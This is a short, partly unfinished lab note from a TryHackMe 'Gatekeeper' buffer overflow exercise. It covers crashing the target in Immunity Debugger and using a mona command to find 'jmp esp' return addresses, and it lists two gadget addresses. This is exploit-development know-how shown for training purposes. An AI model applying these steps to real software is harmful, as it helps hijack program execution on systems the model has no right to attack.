
We start the program using Immunity Debugger and crash it using out [[Code/badchars.py]] script:
![[Images/Pasted image 20250117221906.png]]

output missing - stream screnshot?



We run the mona command:
`!mona jmp -r esp -cpb "\x00\x0a"`

Output:
```sh
080414C3    0x080414c3 : jmp esp |  {PAGE_EXECUTE_READ} [gatekeeper.exe] ASLR: False, Rebase: False, SafeSEH: True, CFG: False, OS: True, v-1.0- (C:\Users\Windows10x64VMUser\Desktop\thm-gatekeeper\gatekeeper.exe), 0x8000
080416BF    0x080416bf : jmp esp |  {PAGE_EXECUTE_READ} [gatekeeper.exe] ASLR: False, Rebase: False, SafeSEH: True, CFG: False, OS: True, v-1.0- (C:\Users\Windows10x64VMUser\Desktop\thm-gatekeeper\gatekeeper.exe), 0x8000
```

We now have two instruction we can use to jump to our code.
